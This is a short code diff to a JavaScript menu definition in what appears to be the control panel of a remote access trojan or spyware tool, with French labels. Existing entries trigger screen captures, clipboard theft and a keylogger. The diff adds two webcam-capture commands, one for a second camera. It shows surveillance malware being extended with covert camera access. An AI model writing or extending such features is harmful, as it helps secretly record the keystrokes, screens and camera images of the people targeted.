@@ -215,6 +215,8 @@ const MODULES = [
     items: [
       { label: "Capture d'écran", verb: "screen" },
       { label: "Rafale (3 frames)", verb: "burst", args: "3" },
+      { label: "Caméra", verb: "cam" },
+      { label: "Caméra ▸ 2e périphérique", verb: "cam", args: "1" },
       { label: "Presse-papiers", verb: "clip" },
       { label: "Keylogger ▸ démarrer", verb: "keylog", args: "on" },
       { label: "Keylogger ▸ arrêter", verb: "keylog", args: "off" },
